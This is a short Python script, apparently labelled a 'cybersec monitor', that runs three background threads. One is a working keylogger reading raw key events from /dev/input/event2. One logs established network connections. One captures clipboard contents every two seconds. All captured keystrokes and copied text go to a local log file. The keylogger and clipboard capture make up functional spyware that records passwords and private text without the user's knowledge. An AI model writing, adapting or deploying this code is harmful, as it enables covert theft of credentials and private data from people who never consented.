import evdev
import psutil
import subprocess
import time
import threading

log_file = "/var/log/cybersec_monitor.log"

def log_to_file(data):
    """ Enregistre les données dans un fichier log """
    with open(log_file, "a") as f:
        f.write(data + "\n")

def keylogger():
    try:
        device = evdev.InputDevice('/dev/input/event2')

        shift_pressed = False

        for event in device.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                key_event = evdev.categorize(event)

                if key_event.keycode in ["KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"]:
                    shift_pressed = key_event.keystate == evdev.KeyEvent.key_down
                    continue

                if key_event.keystate == evdev.KeyEvent.key_down:
                    if key_event.keycode == "KEY_SPACE":
                        log_to_file(" ")
                    elif key_event.keycode.startswith("KEY_"):
                        key = key_event.keycode[4:].lower()
                        if len(key) == 1:
                            key = key.upper() if shift_pressed else key
                            log_to_file(key)
    except Exception as e:
        log_to_file(f"Erreur Keylogger: {e}")

def network_monitor():
    while True:
        try:
            connections = psutil.net_connections(kind='inet')
            for conn in connections:
                if conn.status == psutil.CONN_ESTABLISHED and conn.raddr:
                    log_to_file(f"Connexion {conn.laddr.ip}:{conn.laddr.port} → {conn.raddr.ip}:{conn.raddr.port}")
        except Exception as e:
            log_to_file(f"Erreur Réseau: {e}")
        time.sleep(5)

def clipboard_monitor():
    last_clipboard = ""
    while True:
        try:
            clipboard_content = subprocess.check_output("xclip -selection clipboard -o", shell=True, text=True).strip()
            if clipboard_content and clipboard_content != last_clipboard:
                log_to_file(f"Copié: {clipboard_content}")
                last_clipboard = clipboard_content
        except subprocess.CalledProcessError:
            pass
        time.sleep(2)

if __name__ == "__main__":
    thread_keylogger = threading.Thread(target=keylogger, daemon=True)
    thread_network = threading.Thread(target=network_monitor, daemon=True)
    thread_clipboard = threading.Thread(target=clipboard_monitor, daemon=True)

    thread_keylogger.start()
    thread_network.start()
    thread_clipboard.start()

    while True:
        time.sleep(10)